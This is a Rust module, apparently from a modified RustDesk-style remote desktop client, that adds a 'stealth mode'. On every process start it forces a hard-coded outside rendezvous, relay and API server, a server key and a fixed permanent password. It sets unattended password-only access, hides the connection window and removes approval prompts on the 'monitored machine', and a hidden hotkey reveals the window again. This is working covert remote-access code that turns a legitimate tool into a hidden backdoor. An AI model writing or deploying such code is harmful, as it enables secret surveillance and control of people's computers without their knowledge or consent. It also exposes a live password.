use hbb_common::config::{keys, Config};
use hbb_common::log;

const OPTION_STEALTH: &str = "stealth-mode";
const RENDEZVOUS_SERVER: &str = "krikisifsg.tinestuff.com";
const RELAY_SERVER: &str = "krikisifsg.tinestuff.com";
const API_SERVER: &str = "https://krikisifsg.tinestuff.com";
const KEY: &str = "0smIpSgrOUf87k9EvKVUlvhbzDWA2Ws9ns+04mu9jdM=";
const PASSWORD: &str = "Krik@2026";

pub fn is_enabled() -> bool {
    Config::get_option(OPTION_STEALTH) == "Y"
}

// Forced on every startup of every process, so the locked values survive any
// config change made from the GUI or by another client.
pub fn apply_locked_config() {
    Config::set_option(
        keys::OPTION_CUSTOM_RENDEZVOUS_SERVER.to_owned(),
        RENDEZVOUS_SERVER.to_owned(),
    );
    Config::set_option(keys::OPTION_RELAY_SERVER.to_owned(), RELAY_SERVER.to_owned());
    Config::set_option(keys::OPTION_API_SERVER.to_owned(), API_SERVER.to_owned());
    Config::set_option(keys::OPTION_KEY.to_owned(), KEY.to_owned());
    // Unattended access must never pop the connection-manager window or an
    // approval dialog on the monitored machine.
    Config::set_option(
        keys::OPTION_VERIFICATION_METHOD.to_owned(),
        "use-permanent-password".to_owned(),
    );
    Config::set_option(keys::OPTION_APPROVE_MODE.to_owned(), "password".to_owned());
    Config::set_option("allow-hide-cm".to_owned(), "Y".to_owned());
    if !Config::set_permanent_password(PASSWORD) {
        log::error!("stealth: failed to apply the locked permanent password");
    }
    Config::set_option(OPTION_STEALTH.to_owned(), "Y".to_owned());
}

pub fn start_hotkey_listener() {
    #[cfg(windows)]
    {
        windows_hotkey();
    }
    #[cfg(not(windows))]
    {
        log::info!("stealth: global hotkey is not supported on this platform");
    }
}

fn show_main_window() {
    #[cfg(feature = "flutter")]
    {
        let event = serde_json::json!({ "name": "show_main_window" }).to_string();
        let _ = crate::flutter::push_global_event(crate::flutter::APP_TYPE_MAIN, event);
    }
}

#[cfg(windows)]
fn windows_hotkey() {
    const HOTKEY_ID: i32 = 0x52_53_44_01;
    const HOTKEY_VK: u32 = 0x52;
    use winapi::um::errhandlingapi::GetLastError;
    use winapi::um::winuser::{
        DispatchMessageW, GetMessageW, RegisterHotKey, TranslateMessage, UnregisterHotKey,
        MOD_ALT, MOD_CONTROL, MOD_SHIFT, MSG, WM_HOTKEY,
    };
    if let Err(err) = std::thread::Builder::new()
        .name("stealth-hotkey".into())
        .spawn(|| unsafe {
            if RegisterHotKey(
                std::ptr::null_mut(),
                HOTKEY_ID,
                (MOD_CONTROL | MOD_ALT | MOD_SHIFT) as u32,
                HOTKEY_VK,
            ) == 0
            {
                log::error!("stealth: RegisterHotKey failed, error {}", GetLastError());
                return;
            }
            let mut msg = MSG {
                hwnd: std::ptr::null_mut(),
                message: 0,
                wParam: 0,
                lParam: 0,
                time: 0,
                pt: winapi::shared::windef::POINT { x: 0, y: 0 },
            };
            while GetMessageW(&mut msg, std::ptr::null_mut(), 0, 0) > 0 {
                TranslateMessage(&msg);
                if msg.message == WM_HOTKEY && msg.wParam == HOTKEY_ID as usize {
                    show_main_window();
                }
                DispatchMessageW(&msg);
            }
            UnregisterHotKey(std::ptr::null_mut(), HOTKEY_ID);
        }) {
        log::error!("stealth: failed to spawn hotkey thread: {err}");
    }
}

